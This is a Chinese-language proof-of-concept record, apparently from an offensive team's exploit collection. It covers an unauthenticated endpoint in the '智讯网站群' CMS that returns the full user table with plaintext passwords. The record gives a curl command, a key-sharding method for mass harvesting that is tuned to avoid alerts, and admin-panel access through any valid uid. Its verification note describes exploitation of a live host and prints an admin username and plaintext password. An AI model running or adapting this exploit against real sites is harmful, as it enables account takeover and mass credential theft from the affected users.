# 智讯网站群 root_user_index 免认证读取全站用户表（含明文 opass）｜附 curpage 分页被忽略的踩坑

- **code**: 智讯网站群-root_user_index-免认证读取全站用户表-含明文-opass-附-curpage-分页被忽略的踩坑
- **kind**: poc
- **category**: unauthorized
- **component**: 智讯网站群系统 (x-is-origin: true / PHP 8.1.7)
- **severity**: critical
- **language**: http
- **source**: manual
- **verified**: 1
- **verified_note**: 2026-09-29 在 203.0.113.74（example.com）实测：无 cookie/无 token 调用返回 totalNum=9636 并逐条带出 uid+opass 明文；据此导出 54 个 belong=admin 管理账号（含总管理员 admin/whb82261093），并用其 uid 经 Chrome 实测进入后台（DOM 回显 userid=admin）；并验证 curpage 1..20 页数据不变（new=0）。
- **path**: pocs/智讯网站群-root_user_index-免认证读取全站用户表-含明文-opass-附-curpage-分页被忽略的踩坑/zhanqun_root_user_index.md
- **tags**: 站群,未授权,用户表泄露,uid令牌,分页陷阱
- **created_at**: 2026-09-28T22:11:16.777Z
- **found_by**: exploit

## 描述

智讯网站群 /api/ 的 root_user_index 免认证即可按 LIKE 检索全站用户表并返回明文口令；uid 仅作格式校验的身份令牌。附带"curpage 被接受却无效、全量必须多 key 分片"的踩坑记录。

## 用法

```
见正文"复现命令"；把 &lt;target&gt; 换成任意该站群节点 IP、&lt;site-domain&gt; 换成该站群任一站群域名、uid 用任意一个已知有效 uid（例如从 root_user_index 返回里捡一个）。全量采集用多 key 分片脚本（本机 tools/zx_mass.py）。
```

## 正文

```
## 端点

```
POST http://<target>/api/
Host: <任意该站群的站点域名>
Content-Type: application/x-www-form-urlencoded

action=root_user_index&uid=<任意合法格式uid>&key=<LIKE关键词>&curpage=N&perpage=100
```

## 关键点（踩坑记录）

1. **`uid` 是"身份令牌"而非会话凭据**：服务端只做格式与存在性检查，**不校验会话/密码**。
   - 合法格式：`u` + 44 hex（登录时生成的会话级 uid）**或** 64 hex（老账号 uid）**或** `u` + 15 hex（更老的格式，实测均可）；
   - 格式不符 → `{"code":151}`；格式合法但查无记录 → `{"code":300}`；
   - 只要任意一个有效 uid 即可，**不需要登录**。
2. **`key` 是 LIKE 通配**：`key=%` 命中全表（实测 `totalNum=9636`），`key=admin`/`key=web` 等可精确检索特定账号；`_` 等价于单字符通配；引号会被转义（`key=x'` → totalNum=0，**无 SQL 注入**）。
3. **⭐ 最大的坑：`curpage` 参数被服务端"接受但忽略"**
   - 请求 `curpage=2` 时响应里 `all.curpage=2`、`all.start_limit=10` **看起来生效了**，但 `info` 数组**始终返回同一批 5 条记录**（实测连续 20 页 `new=0`）；
   - `perpage` 同理：传 100 也只返回 5 条；
   - **⇒ 无法靠翻页拿全量**。本队已两次踩到同类坑（另一次是分页参数只认 `page` 而不是 `curpage`）。
4. **拿全量的可行姿势（实测）**：**多 key 分片**
   - 单字符 key（a-z 0-9 `._-@`，36 个）+ 双字符 key（36×36=1296 个），每个 key 取"匹配结果的前 5 条"；
   - 实测 8 个单字符 key 即拿到 28 个唯一用户（含大量重复），累计 1640 个 key 可覆盖数千用户；
   - 速率 1.8 req/s 下约 15 分钟，温和无告警。
5. **同类接口**：`root_set`/`root_init`/`root_line_index`/`root_line_data`/`root_style_index`/`root_log_index`/`root_base` 同样"uid 即身份、免认证"；后台入口 `GET /root/<uid>/` 直接以该 uid 身份渲染管理后台（**无需密码**）。

## 数据形态

`result.info[]` 每条含：`id, uid, userid, login_name, login_ip, passwd(md5), opass(**明文**), belong, classid, domain, email, safe, addTime, loginTime, lastTime`。

## 复现命令

```bash
curl -s -k -H "Host: <site-domain>" -X POST \
  --data-urlencode "action=root_user_index" \
  --data-urlencode "uid=<任意有效uid>" \
  --data-urlencode "key=%" \
  "http://<target>/api/"
```

## 判定

- 返回 `{"code":200,...,"result":{"all":{"totalNum":"N"},"info":[...]}}` 且 info 中带 `opass` 字段 ⇒ 命中。

```
